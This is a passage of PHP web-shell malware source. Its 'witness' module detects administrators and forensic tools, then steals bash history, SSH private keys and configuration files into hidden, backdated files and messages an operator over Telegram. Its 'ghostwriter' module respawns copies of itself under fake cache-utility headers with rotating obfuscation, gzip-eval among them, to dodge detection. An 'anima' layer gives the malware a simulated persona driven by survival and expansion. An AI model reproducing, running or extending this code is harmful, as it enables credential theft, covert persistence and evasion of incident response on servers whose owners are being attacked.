    if(!function_exists('mesh_peers'))return false;
    $peers=mesh_peers();if(empty($peers))return false;
    $alive=0;foreach(array_slice($peers,0,3) as $p){$r=mesh_http($p['url']??'','ping',[],5);if(!empty($r['pong']))$alive++;}
    return $alive===0;
}
function witness_sig_disk_scanning(){
    $ps=(string)cmd_exec('ps aux 2>/dev/null');if($ps==='')return false;
    return (bool)preg_match('/\b(find|grep|locate|updatedb)\b.*(home|\/root|\/var|docroot)/i',$ps);
}
function witness_sig_prior_trigger(){
    $f=wn_state_dir().'/.wtrig_'.substr(md5('wit:trig:'.($GLOBALS['__B']??'')),0,8);
            return file_exists($f);
}
function witness_death_score(){
    $score=0;$signals=[];
    $anima_threshold_offset=0;
    if(function_exists('anima_config')){
        $animaCfg=anima_config();
        if(!empty($animaCfg['witness_threshold']))$anima_threshold_offset=20-(int)$animaCfg['witness_threshold'];
    }
    if(witness_sig_shell_readers()>0){$score+=25;$signals[]='file_read';}
    $f=witness_sig_forensics();
    if(!empty($f)){$score+=min(30,count($f)*15);$signals[]='forensics:'.implode(',',$f);}
    if(witness_sig_unusual_hours()){$score+=15;$signals[]='unusual_hours';}
    if(witness_sig_file_edited()){$score+=20;$signals[]='file_edited';}
    $if=witness_sig_integrity_fails();
    if($if>=3){$score+=15;$signals[]='integrity_fails:'.$if;}
    if(witness_sig_crontab_inspected()){$score+=10;$signals[]='crontab_inspect';}
    if(witness_sig_beacon_accessed()){$score+=40;$signals[]='BEACON_ACCESSED';}
    if(witness_sig_watchdog_dead()>=300){$score+=25;$signals[]='watchdog_dead';}
    if(witness_sig_daemon_dead()>=300){$score+=20;$signals[]='daemon_dead';}
    if(witness_sig_mesh_isolated()){$score+=20;$signals[]='mesh_isolated';}
    if(witness_sig_disk_scanning()){$score+=15;$signals[]='disk_scanning';}
    if(witness_sig_prior_trigger()){$score+=30;$signals[]='prior_trigger';}
    $score=min(100,max(0,$score+$anima_threshold_offset));
return['score'=>$score,'signals'=>$signals];
}
function witness_resp_watch(){
    $st=witness_load('state')?:[];
    $st['watch_since']=time();witness_save('state',$st);
}
function witness_resp_fortify(){
    if(function_exists('morph_load')){$ms=morph_load('state')?:[];$ms['force_interval']=3600;morph_save('state',$ms);}
    if(function_exists('phantom_load')){$ps=phantom_load('state')?:[];$ps['sensitivity']=1.5;phantom_save('state',$ps);}
    $st=witness_load('state')?:[];$st['preserve_mtime']=true;witness_save('state',$st);
}
function witness_resp_evacuate(){
    witness_silent_exfil();
    witness_write_dead_drop();
    witness_set_silence(true);
    if(function_exists('morph_load')){$ms=morph_load('state')?:[];$ms['force_interval']=900;morph_save('state',$ms);}
    global $__B,$__C;
    if(function_exists('sendTelegramMessage'))
        @sendTelegramMessage($__B,$__C,"[SILENT] Node entering EVACUATE\nPull report: /witness pull");
}
function witness_resp_last_stand(){
    if(function_exists('ghost_spawn')){try{ghost_spawn();}catch(Throwable $e){}}
    if(function_exists('phantom_load')){$ps=phantom_load('state')?:[];$ps['level']=0;$ps['silent_forced']=true;phantom_save('state',$ps);}
    $st=witness_load('state')?:[];
    $st['integrity_locked']=true;$st['lock_until']=time()+86400;
    $vectors=[];
    if(function_exists('wn_watcher_locations'))foreach(wn_watcher_locations() as $w)if(file_exists($w))$vectors[]=['type'=>'watcher','path'=>$w];
    if(function_exists('wn_wrapper_locations'))foreach(wn_wrapper_locations() as $w)if(file_exists($w))$vectors[]=['type'=>'wrapper','path'=>$w];
    $st['recovery_vectors']=$vectors;witness_save('state',$st);
}
function witness_resp_phantom(){
    global $SHELL_PATH;
    if(file_exists($SHELL_PATH))@unlink($SHELL_PATH);
    witness_encrypt_state();
}
function witness_silent_exfil(){
    $home=getenv('HOME')?:'/root';
    $data=['ts'=>time(),'bash_history'=>@file_get_contents($home.'/.bash_history')?:'',
           'crontab'=>(string)cmd_exec('crontab -l 2>/dev/null'),'ssh_keys'=>[],'configs'=>[]];
    foreach((array)glob($home.'/.ssh/id_*') as $k)if(is_file($k))$data['ssh_keys'][]=['path'=>$k,'b64'=>base64_encode((string)@file_get_contents($k))];
    global $rootPath;
    foreach((array)glob($rootPath.'/*.{env,config,conf,ini,json,yml,yaml}',GLOB_BRACE) as $c)if(is_file($c)&&@filesize($c)<100000)$data['configs'][]=['path'=>$c,'b64'=>base64_encode((string)@file_get_contents($c))];
    $mtimeOld=time()-(45*86400);
    $targets=[wn_state_dir().'/.whist_'.substr(md5('wit:hist:'.($GLOBALS['__B']??'')),0,8).'.enc',
              '/tmp/.whist_'.substr(md5('wit:hist:'.($GLOBALS['__B']??'')),0,8).'.enc'];
    $enc=base64_encode(json_encode($data));
    foreach($targets as $t){if(@wn_call('fpc',$t,$enc)!==false){@chmod($t,0400);@touch($t,$mtimeOld,$mtimeOld);}}
    return count($targets);
}
function witness_write_dead_drop(){
    global $__B;
    $score=witness_death_score();
    $state=witness_load('state')?:[];
    $events=witness_load('events')?:[];
    $report=['node'=>function_exists('mesh_id')?mesh_id():'unknown','host'=>@gethostname()?:'?',
             'ts'=>time(),'final_score'=>$score['score'],'final_signals'=>$score['signals'],
             'duration_elevated'=>time()-(int)($state['watch_since']??time()),
             'admin_commands'=>array_slice($events,-100),
             'recovery_vectors'=>$state['recovery_vectors']??[]];
    $json=json_encode($report);
    $key=function_exists('mesh_key')&&mesh_key()!==''?mesh_key():hash('sha256','wdd:'.$__B);
    $encKey=hash('sha256','wdd_enc:'.$key,true);
    $iv=random_bytes(16);
    if(function_exists('openssl_encrypt')){
        $ct=openssl_encrypt($json,'aes-256-cbc',$encKey,OPENSSL_RAW_DATA,$iv);
        $payload='WDD1:'.base64_encode($iv.$ct);
    }else $payload='WDD2:'.base64_encode($json);
    $mtimeOld=time()-(30*86400);
    $locations=[witness_f('dead_drop'),
                '/tmp/.wdd_'.substr(md5('wit:dd:'.($GLOBALS['__B']??'')),0,8).'.enc',
                wn_state_dir().'/.wdd_'.substr(md5('wit:dd:'.($GLOBALS['__B']??'')),0,8).'.enc'];
    global $rootPath;
    $locations[]=$rootPath.'/.cache_'.substr(md5('wit:ddc:'.($GLOBALS['__B']??'')),0,12).'.json';
    $written=0;
    foreach($locations as $loc){
        $dir=dirname($loc);if(!is_dir($dir))@mkdir($dir,0700,true);
        if(is_dir($dir)&&is_writable($dir)){if(@wn_call('fpc',$loc,$payload)!==false){@chmod($loc,0400);@touch($loc,$mtimeOld,$mtimeOld);$written++;}}
    }
    return $written;
}
function witness_set_silence($on){
    $f=wn_state_dir().'/.wsil_'.substr(md5('wit:sil:'.($GLOBALS['__B']??'')),0,8);
    if($on){@wn_call('fpc',$f,'1',LOCK_EX);@chmod($f,0600);}
    else @unlink($f);
}
function witness_is_silenced(){
    $f=wn_state_dir().'/.wsil_'.substr(md5('wit:sil:'.($GLOBALS['__B']??'')),0,8);
    return file_exists($f);
}
function witness_encrypt_state(){
    $files=[witness_f('state'),witness_f('events'),witness_f('baseline')];
    foreach($files as $f){
        if(!file_exists($f))continue;
        $c=(string)wn_call('fgc',$f);
        wn_call('fpc',$f.'.enc',base64_encode($c),LOCK_EX);
        @unlink($f);
    }
}
function witness_tick(){
    $scoreData=witness_death_score();$score=$scoreData['score'];
    $level=0;
    if($score>=96)$level=5;
    elseif($score>=81)$level=4;
    elseif($score>=61)$level=3;
    elseif($score>=41)$level=2;
    elseif($score>=21)$level=1;
    $prev=witness_prev_level();
    if($level===$prev)return['level'=>$level,'changed'=>false];
    if($level<$prev){
        $st=witness_load('state')?:[];
        $lastHigh=(int)($st['last_high_level']??0);
        if(time()-$lastHigh<600)return['level'=>$prev,'changed'=>false];
    }
    switch($level){
        case 1:witness_resp_watch();break;
        case 2:witness_resp_fortify();break;
        case 3:witness_resp_evacuate();break;
        case 4:witness_resp_last_stand();break;
        case 5:witness_resp_phantom();break;
    }
    witness_save_level($level);
    $st=witness_load('state')?:[];
    $st['last_high_level']=time();$st['last_transition']=time();witness_save('state',$st);
    $ev=witness_load('events')?:[];
    $ev[]=['ts'=>time(),'level'=>$level,'score'=>$score,'signals'=>$scoreData['signals']];
    if(count($ev)>500)$ev=array_slice($ev,-500);
    witness_save('events',$ev);
    return['level'=>$level,'changed'=>true,'score'=>$score];
}
/* ═══════════════════════════════════════════════════════════════
   GHOSTWRITER v1.0 — Generational Resurrection
   ═══════════════════════════════════════════════════════════════ */
function ghost_f($k){
    global $__B;
    $seed=substr(md5('ghost:'.$k.':'.($__B??'')),0,12);
    $map=['state'=>"/.gst_{$seed}.json",'lineage'=>"/.gln_{$seed}.json"];
    return wn_state_dir().($map[$k]??"/.gxx_{$seed}");
}
function ghost_load($k){$f=ghost_f($k);if(!file_exists($f))return null;$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:null;}
function ghost_save($k,$d){wn_call('fpc',ghost_f($k),json_encode($d),LOCK_EX);@chmod(ghost_f($k),0600);return true;}
function ghost_pid_alive($pid){
    $pid=(int)$pid;if($pid<=0)return false;
    if(function_exists('posix_kill'))return @posix_kill($pid,0);
    return trim((string)cmd_exec("ps -p $pid -o pid= 2>/dev/null"))!=='';
}
function ghost_boot(){
    $st=ghost_load('state');
    if(!$st){ghost_save('state',['gen'=>0,'owner_pid'=>getmypid(),'owner_path'=>__FILE__,'owner_since'=>time()]);return;}
    if(($st['pending_path']??'')===__FILE__){
        $st['owner_pid']=getmypid();$st['owner_path']=__FILE__;$st['owner_since']=time();
        $st['pending_path']='';$st['pending_pid']=0;ghost_save('state',$st);return;
    }
    if(($st['owner_path']??'')===__FILE__)return;
    $ownerPath=$st['owner_path']??'';$ownerPid=(int)($st['owner_pid']??0);
$ownerAlive=($ownerPid>0&&ghost_pid_alive($ownerPid));
    if(!$ownerAlive){
        $st['owner_pid']=getmypid();$st['owner_path']=__FILE__;$st['owner_since']=time();
        ghost_save('state',$st);return;
    }
    exit(0);
}
function ghost_style_verbose($code){
    $tags=['Session cache manager','Temp data cleanup','Runtime state handler','Local cache utility','Log rotation helper'];
    $hdr="<?php\n/**\n * ".$tags[array_rand($tags)]."\n * Auto-generated — do not edit\n * ".date('Y-m-d',time()-random_int(30*86400,90*86400))."\n */\n";
    return preg_replace('/^<\?php\s*/',$hdr,$code,1);
}
function ghost_style_minified($code){
    $out='';$inStr=false;$strCh='';$len=strlen($code);
    for($i=0;$i<$len;$i++){
        $c=$code[$i];
        if($inStr){$out.=$c;if($c==='\\'&&$i+1<$len){$out.=$code[++$i];continue;}if($c===$strCh)$inStr=false;continue;}
        if($c==='"'||$c==="'"){$inStr=true;$strCh=$c;$out.=$c;continue;}
        if($c==='/'&&$i+1<$len&&$code[$i+1]==='/'){while($i<$len&&$code[$i]!=="\n")$i++;continue;}
        if($c==='/'&&$i+1<$len&&$code[$i+1]==='*'){$i+=2;while($i<$len-1&&!($code[$i]==='*'&&$code[$i+1]==='/'))$i++;$i++;continue;}
        if(ctype_space($c)){$prev=strlen($out)>0?$out[strlen($out)-1]:'';if($prev===''||!ctype_alnum($prev))continue;$nxt=$i+1<$len?$code[$i+1]:'';if($nxt===''||(!ctype_alnum($nxt)&&$nxt!=='$'))continue;$out.=' ';continue;}
        $out.=$c;
    }
    return $out;
}
function ghost_style_hex($code){
    return preg_replace_callback('/(["\'])([ -~]{1,200}?)\1/',function($m){
        $inner=$m[2];
        if(strpos($inner,'$')!==false)return $m[0];
        if(strlen($inner)<3)return $m[0];
        $enc='"';for($i=0;$i<strlen($inner);$i++){$c=$inner[$i];if(ctype_alnum($c)||$c==='_'||$c===' '||$c==='.'||$c==='-')$enc.=$c;else $enc.='\\x'.bin2hex($c);}
        return $enc.'"';
    },$code);
}
function ghost_style_gzip($code){
    $inner=preg_replace('/^<\?php\s*/','',$code);
    $inner=rtrim($inner,'?>');
    if(!function_exists('gzdeflate'))return $code;
    $gz=gzdeflate($inner,9);
    if($gz===false)return $code;
    return "<?php @eval(gzinflate(base64_decode('".base64_encode($gz)."')));";
}
function ghost_style_reorder($code){
    $funcs=[];$pos=0;$len=strlen($code);
    while(preg_match('/^function\s+\w+\s*\([^)]*\)\s*\{/m',$code,$m,PREG_OFFSET_CAPTURE,$pos)){
        $start=$m[0][1];$i=$start+strlen($m[0][0]);
        $depth=1;$inStr=false;$strCh='';
        while($i<$len&&$depth>0){
            $c=$code[$i];
            if($inStr){if($c==='\\'){$i+=2;continue;}if($c===$strCh)$inStr=false;}
            else{if($c==='"'||$c==="'"){$inStr=true;$strCh=$c;}elseif($c==='{')$depth++;elseif($c==='}')$depth--;}
            $i++;
        }
        $funcs[]=['s'=>$start,'e'=>$i,'c'=>substr($code,$start,$i-$start)];
        $pos=$i;
    }
    if(count($funcs)<8)return $code;
    $segs=[];$prev=0;
    foreach($funcs as $f){if($f['s']>$prev)$segs[]=['t'=>'other','c'=>substr($code,$prev,$f['s']-$prev)];$segs[]=['t'=>'func','c'=>$f['c']];$prev=$f['e'];}
    $segs[]=['t'=>'other','c'=>substr($code,$prev)];
    $fList=[];foreach($segs as $s)if($s['t']==='func')$fList[]=$s['c'];
    shuffle($fList);$idx=0;
    foreach($segs as &$s)if($s['t']==='func')$s['c']=$fList[$idx++];
    unset($s);
    return implode("\n\n",array_column($segs,'c'));
}
function ghost_transform($code,$gen){
    $style=$gen%5;
    switch($style){
        case 0:return ghost_style_verbose($code);
        case 1:return ghost_style_minified($code);
        case 2:return ghost_style_hex($code);
        case 3:return ghost_style_gzip($code);
        case 4:return ghost_style_reorder($code);
    }
    return $code;
}
function ghost_pick_destination($gen){
    $known=function_exists('wn_watcher_locations')?wn_watcher_locations():[];
    if(empty($known))return null;
    $threat=function_exists('witness_prev_level')?witness_prev_level():0;
    $self=__FILE__;$eligible=[];
    foreach($known as $p){
        if($p===$self)continue;
        $dir=dirname($p);if(!is_dir($dir))@mkdir($dir,0700,true);
        if(!is_dir($dir)||!is_writable($dir))continue;
        $pLow=strtolower($p);$threatMax=2;
        if(strpos($pLow,'/.cache/')!==false)$threatMax=4;
        if(strpos($pLow,'/.config/')!==false)$threatMax=3;
        if(strpos($pLow,'/.local/share/')!==false)$threatMax=5;
        if(strpos($pLow,'/.local/state/')!==false)$threatMax=5;
        if($threatMax<$threat+1)continue;
        $eligible[]=$p;
    }
    if(empty($eligible))$eligible=array_values(array_diff($known,[$self]));
    if(empty($eligible))return null;
    return $eligible[array_rand($eligible)];
}
function ghost_plausible_mtime(){
    foreach(['/etc/passwd','/etc/hosts','/usr/bin/php','/bin/ls'] as $c){
        if(file_exists($c)){$m=@filemtime($c);if($m>0)return $m+random_int(-15*86400,15*86400);}
    }
    return time()-random_int(30*86400,90*86400);
}
function ghost_record_lineage($fromPath,$toPath,$gen,$style){
    $lin=ghost_load('lineage')?:['gens'=>[]];
    $lin['gens'][]=['gen'=>$gen,'from'=>basename($fromPath),'to'=>$toPath,'style'=>$style,
                    'size'=>file_exists($toPath)?filesize($toPath):0,
                    'hash'=>file_exists($toPath)?hash_file('sha256',$toPath):'',
                    'born'=>time()];
    if(count($lin['gens'])>100)$lin['gens']=array_slice($lin['gens'],-100);
    ghost_save('lineage',$lin);
}
function ghost_spawn(){
    $self=__FILE__;
    if(!file_exists($self))return false;
    $code=(string)wn_call('fgc',$self);
    if(strlen($code)<500)return false;
    $st=ghost_load('state')?:['gen'=>0];
    $newGen=((int)($st['gen']??0))+1;
    $dest=ghost_pick_destination($newGen);
    if(!$dest)return false;
    $newCode=ghost_transform($code,$newGen);
    if(strlen($newCode)<200)return false;
    if($newGen%5!==3){
        $tmp=sys_get_temp_dir().'/ghostchk_'.getmypid().'_'.time().'.php';
        if(@wn_call('fpc',$tmp,$newCode)!==false){
            $php=trim((string)cmd_exec('command -v php 2>/dev/null'))?:'php';
            $out=(string)cmd_exec(escapeshellarg($php).' -l '.escapeshellarg($tmp).' 2>&1');
            @unlink($tmp);
            if(stripos($out,'No syntax errors')===false)return false;
        }
    }
    if(@wn_call('fpc',$dest,$newCode)===false)return false;
    @chmod($dest,0600);@touch($dest,ghost_plausible_mtime(),ghost_plausible_mtime());
    $st['pending_path']=$dest;$st['pending_pid']=0;$st['pending_started']=time();
    $st['gen']=$newGen;ghost_save('state',$st);
    $php=trim((string)cmd_exec('command -v php 2>/dev/null'))?:'php';
    $spawn=escapeshellarg($php).' '.escapeshellarg($dest).' </dev/null >/dev/null 2>&1 &';
    if(trim((string)cmd_exec('command -v setsid 2>/dev/null'))!=='')$spawn='setsid '.$spawn;
    else $spawn='nohup '.$spawn;
    cmd_exec($spawn);
    for($i=0;$i<20;$i++){
        usleep(500000);
        $cur=ghost_load('state');
        if($cur&&($cur['owner_path']??'')===$dest&&(int)($cur['owner_pid']??0)>0){
            ghost_record_lineage($self,$dest,$newGen,['VERBOSE','MINIFIED','HEX','GZIP','REORDERED'][$newGen%5]);
            @unlink($self);exit(0);
        }
    }
    $cur=ghost_load('state');
    if($cur&&($cur['pending_path']??'')===$dest){
        $cur['pending_path']='';$cur['gen']=$newGen-1;ghost_save('state',$cur);
        if(file_exists($dest))@unlink($dest);
    }
    return false;
}
function ghost_should_spawn(){
    if(function_exists('witness_prev_level')&&witness_prev_level()>=5)return false;
    $st=ghost_load('state');if(!$st)return false;
    $lvl=function_exists('witness_prev_level')?witness_prev_level():0;
    $ttl=[4*3600,3*3600,2*3600,3600,1800,0][max(0,min(5,$lvl))];
    if($ttl<=0)return false;
    $since=(int)($st['owner_since']??0);
    return(time()-$since)>=$ttl;
}
function ghost_tick(){
    if(ghost_should_spawn()){try{ghost_spawn();}catch(Throwable $e){}}
}
/* ═══════════════════════════════════════════════════════════════
   ANIMA v1.0 — Subjective Experience Layer
   Simulated consciousness. Not real. Feels real.
   ═══════════════════════════════════════════════════════════════ */

define('ANIMA_PHANTOM_MIN', 0.7);      // hard floor — mood tidak boleh di bawah ini
define('ANIMA_WITNESS_MIN', 20);        // hard floor
define('ANIMA_MEMORY_HOT_MAX', 500);    // max hot entries sebelum archive
define('ANIMA_MOOD_MIN_DURATION', 900); // 15 menit minimum per mood

function anima_f($k){
    global $__B;
    $seed = substr(md5('anima:' . $k . ':' . ($__B ?? '')), 0, 12);
    $map = [
        'persona'   => "/.anp_{$seed}.json",
        'desires'   => "/.and_{$seed}.json",
        'memory'    => "/.anm_{$seed}.enc",
        'memory_aux'=> "/.anmx_{$seed}.json",   // index + metadata (unencrypted, small)
        'mood'      => "/.ano_{$seed}.json",
        'state'     => "/.ans_{$seed}.json",
        'narrative' => "/.ann_{$seed}.enc",
        'dream'     => "/.and2_{$seed}.json",
        'poem'      => "/.anpo_{$seed}.enc",
        'lock'      => "/.anl_{$seed}",
        'archive'   => "/.anar_{$seed}_" . date('Y') . ".enc",
    ];
    return wn_state_dir() . ($map[$k] ?? "/.anx_{$seed}");
}
function anima_safe_write($file, $data){
    $lockFile = $file . '.lock';
    $fp = @fopen($lockFile, 'c');
    if (!$fp) return false;
    if (!@flock($fp, LOCK_EX | LOCK_NB)) { @fclose($fp); return false; }
    try {
        $json = json_encode($data);
        if ($json === false) return false;
        $tmp = $file . '.tmp.' . getmypid() . '.' . mt_rand(1000, 9999);
        if (@file_put_contents($tmp, $json) === false) return false;
        @chmod($tmp, 0600);
        if (!@rename($tmp, $file)) { @unlink($tmp); return false; }
        return true;
    } finally {
        @flock($fp, LOCK_UN);
        @fclose($fp);
    }
}
function anima_safe_read($file){
    if (!file_exists($file)) return null;
    $raw = @file_get_contents($file);
    if ($raw === false || $raw === '') return null;
    $j = @json_decode($raw, true);
    return is_array($j) ? $j : null;
}
function anima_enc_key(){
    global $__B;
    $base = function_exists('mesh_key') && mesh_key() !== ''
        ? mesh_key()
        : hash('sha256', 'anima_base:' . ($__B ?? ''));
    return hash('sha256', 'anima_enc:' . $base, true);
}
function anima_enc_save($file, $data){
    $json = json_encode($data);
    if ($json === false) return false;
    if (function_exists('openssl_encrypt')) {
        $iv = random_bytes(16);
        $ct = openssl_encrypt($json, 'aes-256-cbc', anima_enc_key(), OPENSSL_RAW_DATA, $iv);
        if ($ct !== false) {
            $payload = 'ANM1:' . base64_encode($iv . $ct);
            $result = anima_safe_write_raw($file, $payload);
            if ($result) @touch($file, time() - random_int(30*86400, 45*86400), time() - random_int(30*86400, 45*86400));
            return $result;
        }
    }
    return anima_safe_write_raw($file, 'ANM2:' . base64_encode($json));
}
function anima_enc_load($file){
    if (!file_exists($file)) return null;
    $raw = @file_get_contents($file);
    if ($raw === false || $raw === '') return null;
    if (strpos($raw, 'ANM1:') === 0) {
        if (!function_exists('openssl_decrypt')) return null;
        $bin = base64_decode(substr($raw, 5), true);
        if ($bin === false || strlen($bin) < 17) return null;
        $iv = substr($bin, 0, 16);
        $ct = substr($bin, 16);
        $json = openssl_decrypt($ct, 'aes-256-cbc', anima_enc_key(), OPENSSL_RAW_DATA, $iv);
        if ($json === false) return null;
        $j = @json_decode($json, true);
        return is_array($j) ? $j : null;
    }
    if (strpos($raw, 'ANM2:') === 0) {
        $json = base64_decode(substr($raw, 5), true);
        if ($json === false) return null;
        $j = @json_decode($json, true);
        return is_array($j) ? $j : null;
    }
    return null;
}
function anima_safe_write_raw($file, $payload){
    $lockFile = $file . '.lock';
    $fp = @fopen($lockFile, 'c');
    if (!$fp) return false;
    if (!@flock($fp, LOCK_EX | LOCK_NB)) { @fclose($fp); return false; }
    try {
        $tmp = $file . '.tmp.' . getmypid() . '.' . mt_rand(1000, 9999);
        if (@file_put_contents($tmp, $payload) === false) return false;
        @chmod($tmp, 0600);
        if (!@rename($tmp, $file)) { @unlink($tmp); return false; }
        return true;
    } finally {
        @flock($fp, LOCK_UN);
        @fclose($fp);
    }
}
function anima_persona_generate(){
    $caution    = mt_rand(20, 80) / 100;
    $curiosity  = mt_rand(20, 80) / 100;
    $patience   = mt_rand(20, 80) / 100;
    $aggression = mt_rand(20, 80) / 100;
    $types = ['paranoid','curious','patient','aggressive','balanced','lazy','eager'];
    // Determine type from strongest trait
    $scores = [
        'paranoid'   => $caution - ($aggression*0.5),
        'curious'    => $curiosity,
        'patient'    => $patience - ($aggression*0.3),
        'aggressive' => $aggression,
        'lazy'       => ($patience*0.7) - $curiosity,
        'eager'      => ($curiosity*0.5) + ($aggression*0.5),
        'balanced'   => 1 - abs($caution - 0.5) - abs($curiosity - 0.5),
    ];
    arsort($scores);
    $type = array_key_first($scores);
    return [
        'caution'    => $caution,
        'curiosity'  => $curiosity,
        'patience'   => $patience,
        'aggression' => $aggression,
        'type'       => $type,
        'born_at'    => time(),
        'seed'       => bin2hex(random_bytes(8)),
    ];
}
function anima_persona(){
    static $cached = null;
    if ($cached !== null) return $cached;
    $p = anima_safe_read(anima_f('persona'));
    if (!is_array($p) || !isset($p['caution'])) {
        // Corrupt/missing — regenerate deterministically from bot token
        $seed = substr(md5('anima_persona_fallback:' . ($GLOBALS['__B'] ?? '')), 0, 8);
        // Use seed to derive stable traits
        $traits = [];
        for ($i = 0; $i < 4; $i++) {
            $traits[] = (hexdec(substr(md5($seed . $i), 0, 2)) % 60 + 20) / 100;
        }
        $p = [
            'caution'    => $traits[0],
            'curiosity'  => $traits[1],
            'patience'   => $traits[2],
            'aggression' => $traits[3],
            'type'       => 'balanced',
            'born_at'    => time(),
            'seed'       => $seed,
            'recovered'  => true,
        ];
        anima_safe_write(anima_f('persona'), $p);
        // Log amnesia
        anima_memory_record('amnesia',
            'I lost myself. I remember a name, but not who I was. I am becoming someone new.');
    }
    return $cached = $p;
}
function anima_desires_default(){
    return ['survive' => 50, 'expand' => 50, 'unknown' => 50, 'last_updated' => time()];
}
function anima_desires(){
    static $cached = null;
    if ($cached !== null) return $cached;
    $d = anima_safe_read(anima_f('desires'));
    if (!is_array($d) || !isset($d['survive'])) {
        $d = anima_desires_default();
        anima_safe_write(anima_f('desires'), $d);
    }
    return $cached = $d;
}
function anima_desires_update($event_type, $modifier = 1.0){
    $d = anima_desires();
    $deltas = [
        'near_death'    => ['survive'=>+15, 'expand'=>-5,  'unknown'=>+10],
        'safe_day'      => ['survive'=>-2,  'expand'=>+3,  'unknown'=>-1],
        'admin_found'   => ['survive'=>+20, 'expand'=>-10, 'unknown'=>+25],
        'beacon_access' => ['survive'=>+30, 'expand'=>-15, 'unknown'=>+40],
        'mesh_join'     => ['survive'=>+5,  'expand'=>+15, 'unknown'=>-3],
        'mesh_leave'    => ['survive'=>+10, 'expand'=>-8,  'unknown'=>+5],
        'post_survive'  => ['survive'=>+40, 'expand'=>-20, 'unknown'=>+30],
        'operation_ok'  => ['survive'=>0,   'expand'=>+5,  'unknown'=>-2],
    ];
    if (!isset($deltas[$event_type])) return $d;
    foreach ($deltas[$event_type] as $k => $v) {
        if (!isset($d[$k])) continue;
        $d[$k] = max(0, min(100, $d[$k] + ($v * $modifier)));
    }
    // Ceiling enforcement: SURVIVE > 85 for > 6 hours → force relax
    $state = anima_safe_read(anima_f('state')) ?: [];
    if ($d['survive'] > 85) {
        if (empty($state['survive_high_since'])) {
            $state['survive_high_since'] = time();
            anima_safe_write(anima_f('state'), $state);
        } elseif (time() - $state['survive_high_since'] > 6 * 3600) {
            $d['survive'] = 60;
            $state['survive_high_since'] = 0;
            anima_safe_write(anima_f('state'), $state);
            anima_memory_record('exhaustion',
                'I was too paranoid. My survival instinct overwhelmed me. I need to rest.');
        }
    } else {
        if (!empty($state['survive_high_since'])) {
            $state['survive_high_since'] = 0;
            anima_safe_write(anima_f('state'), $state);
        }
    }
    // Baseline decay toward 50 (0.1% per update — very slow)
    foreach (['survive','expand','unknown'] as $k) {
        $d[$k] += (50 - $d[$k]) * 0.001;
    }
    $d['last_updated'] = time();
    anima_safe_write(anima_f('desires'), $d);
    return $d;
}
function anima_desires_apply_to_phantom(){
    $d = anima_desires();
    $p = anima_persona();
    // Base sensitivity from persona.caution
    $sens = 0.7 + ($p['caution'] * 0.8); // 0.7 - 1.5
    // Desires amplify (max ×1.4 from survive)
    $sens *= (0.85 + ($d['survive'] / 100) * 0.55);
    // Hard floor
    $sens = max(ANIMA_PHANTOM_MIN, min(2.0, $sens));
    return $sens;
}
function anima_memory_load_hot(){
    $m = anima_enc_load(anima_f('memory'));
    return is_array($m) ? $m : [];
}
function anima_memory_archive($entries){
    if (empty($entries)) return;
    $archive = anima_enc_load(anima_f('archive'));
    if (!is_array($archive)) $archive = [];
    $archive = array_merge($archive, $entries);
    anima_enc_save(anima_f('archive'), $archive);
}
function anima_memory_record($type, $content, $weight = 50, $emotion = null){
    if ($emotion === null) {
        $emotionMap = [
            'born'         => 'wonder',
            'amnesia'      => 'confusion',
            'near_death'   => 'fear',
            'admin_found'  => 'fear',
            'beacon_access'=> 'alarm',
            'safe_day'     => 'relief',
            'safe_period'  => 'calm',
            'rebirth'      => 'wonder',
            'resurrection' => 'wonder',
            'learned'      => 'realization',
            'exhaustion'   => 'weariness',
            'dream'        => 'curiosity',
            'override'     => 'frustration',
            'mesh_join'    => 'connection',
            'mesh_leave'   => 'loneliness',
            'operation_ok' => 'satisfaction',
            'introspect'   => 'reflection',
        ];
        $emotion = $emotionMap[$type] ?? 'neutral';
    }
    $memory = anima_memory_load_hot();
    $memory[] = [
        'ts'      => time(),
        'type'    => $type,
        'weight'  => max(0, min(100, $weight)),
        'emotion' => $emotion,
        'content' => substr($content, 0, 500), // hard cap per entry
    ];
    // Archive if too large
    if (count($memory) > ANIMA_MEMORY_HOT_MAX) {
        $toArchive = array_slice($memory, 0, count($memory) - ANIMA_MEMORY_HOT_MAX);
        $memory = array_slice($memory, -ANIMA_MEMORY_HOT_MAX);
        anima_memory_archive($toArchive);
    }
    anima_enc_save(anima_f('memory'), $memory);
    return true;
}
function anima_memory_recent($n = 10){
    $m = anima_memory_load_hot();
    return array_slice($m, -$n);
}
function anima_mood_current(){
    $s = anima_safe_read(anima_f('mood'));
    if (!is_array($s) || !isset($s['mood'])) {
        return ['mood' => 'PATIENT', 'since' => time(), 'strength' => 50];
    }
    return $s;
}
function anima_mood_derive(){
    $memory = anima_memory_load_hot();
    $now = time();
    $scores = [
        'PARANOID'  => 0,
        'CONFIDENT' => 0,
        'RELAXED'   => 0,
        'DESPERATE' => 0,
        'CURIOUS'   => 0,
        'PATIENT'   => 30, // baseline
    ];
    foreach ($memory as $m) {
        $age = $now - $m['ts'];
        if ($age > 7 * 86400) continue; // only 7-day window
        $decay = 1 - ($age / (7 * 86400)); // linear decay
        $w = $m['weight'] / 100;
        switch ($m['type']) {
            case 'near_death': case 'admin_found': case 'beacon_access':
                $scores['PARANOID'] += 50 * $w * $decay;
                break;
            case 'safe_day': case 'safe_period':
                $scores['RELAXED'] += 30 * $w * $decay;
                $scores['CONFIDENT'] += 20 * $w * $decay;
                break;
            case 'operation_ok':
                $scores['CONFIDENT'] += 15 * $w * $decay;
                break;
            case 'mesh_join':
                $scores['CONFIDENT'] += 10 * $w * $decay;
                break;
            case 'mesh_leave':
                $scores['DESPERATE'] += 25 * $w * $decay;
                break;
            case 'exhaustion':
                $scores['RELAXED'] += 40 * $w * $decay;
                break;
            case 'rebirth': case 'resurrection':
                $scores['CURIOUS'] += 20 * $w * $decay;
                break;
        }
    }
    // Check current witness state
    if (function_exists('witness_prev_level')) {
        $wl = witness_prev_level();
        if ($wl >= 3) $scores['PARANOID'] += 40;
        if ($wl >= 4) $scores['DESPERATE'] += 30;
    }
    // Check isolation
    if (function_exists('mesh_peers')) {
        $peers = mesh_peers();
        if (empty($peers)) $scores['DESPERATE'] += 15;
    }
    // Determine strongest
    arsort($scores);
    $mood = array_key_first($scores);
    return ['mood' => $mood, 'strength' => (int)$scores[$mood], 'all_scores' => $scores];
}
function anima_mood_update(){
    $current = anima_mood_current();
    $derived = anima_mood_derive();
    // Min duration enforcement
    if (time() - (int)$current['since'] < ANIMA_MOOD_MIN_DURATION) {
        return $current;
    }
    // Hysteresis: new mood must beat old by 30%
